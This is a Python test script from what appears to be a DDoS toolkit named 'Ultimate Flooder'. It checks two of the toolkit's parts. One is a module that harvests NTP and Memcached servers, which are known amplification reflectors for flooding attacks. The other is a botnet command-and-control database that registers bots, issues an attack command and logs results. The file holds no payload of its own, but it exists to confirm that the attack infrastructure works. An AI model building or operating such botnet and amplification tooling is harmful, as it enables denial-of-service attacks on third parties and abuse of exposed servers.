#!/usr/bin/env python3
"""
Test API and C2 functionality
"""

from src.utils.api_clients import amplification_hunter
from src.core.c2 import BotnetC2
import os

def test_api_integration():
    print("🔍 Testing API Integration...")
    try:
        # Test NTP servers
        print("  Fetching NTP servers...")
        ntp_servers = amplification_hunter.get_ntp_servers(limit=3)
        print(f"  ✓ Found {len(ntp_servers)} NTP servers")

        # Test Memcached servers
        print("  Fetching Memcached servers...")
        memcached_servers = amplification_hunter.get_memcached_servers(limit=3)
        print(f"  ✓ Found {len(memcached_servers)} Memcached servers")

        return True
    except Exception as e:
        print(f"  ✗ API test failed: {e}")
        return False

def test_c2_database():
    print("\n💾 Testing C2 Database...")
    try:
        # Create C2 instance
        c2 = BotnetC2(db_path='test_c2.db')

        # Test database operations
        print("  Saving test bots...")
        c2.save_bot('test_bot_1', '192.168.1.100', 12345, {'os': 'windows'})
        c2.save_bot('test_bot_2', '192.168.1.101', 12346, {'os': 'linux'})

        print("  Saving test command...")
        cmd_id = c2.save_command('TEST_ATTACK', 'admin')

        print("  Saving command result...")
        c2.save_command_result(cmd_id, 'test_bot_1', 'Success')

        print("  Getting statistics...")
        stats = c2.get_bot_stats()
        print(f"  ✓ Total bots: {stats['total_bots']}")
        print(f"  ✓ Total commands: {stats['total_commands']}")

        # Cleanup
        if os.path.exists('test_c2.db'):
            os.remove('test_c2.db')

        return True
    except Exception as e:
        print(f"  ✗ C2 test failed: {e}")
        return False

if __name__ == "__main__":
    print("🚀 Ultimate Flooder Enhancement Test")
    print("=" * 50)

    api_success = test_api_integration()
    c2_success = test_c2_database()

    print("\n" + "=" * 50)
    if api_success and c2_success:
        print("✅ All enhancements working perfectly!")
    elif api_success:
        print("⚠️  API integration working, C2 database needs attention")
    elif c2_success:
        print("⚠️  C2 database working, API integration needs keys")
    else:
        print("❌ Both enhancements need fixes")